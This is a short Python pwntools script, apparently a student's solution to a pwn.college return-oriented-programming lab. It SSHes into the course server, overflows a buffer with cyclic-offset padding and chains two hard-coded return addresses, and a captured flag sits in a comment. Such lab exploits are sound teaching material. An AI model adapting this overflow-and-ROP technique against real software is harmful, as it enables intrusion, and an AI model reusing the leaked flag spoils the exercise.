#!/usr/bin/env python3
#pwn_college{Q2JXiNSC13q8aIcgzMGUtwSK95x.dZTNywCN2gzW}
#python3 solution.py

from pwn import *

target_address_1 = 0x401ac0
target_address_2 = 0x401af3

s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level2_testing1")
#p = process("./babyrop_level2_testing1")
#raw_input("attach gdb")

p.recvuntil("### Welcome to ./babyrop_level2_testing1!\n###")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("naaaaaaa", n=8)
payload = pad + p64(target_address_1) + p64(target_address_2)

print(payload)
p.sendline(payload)
p.interactive()

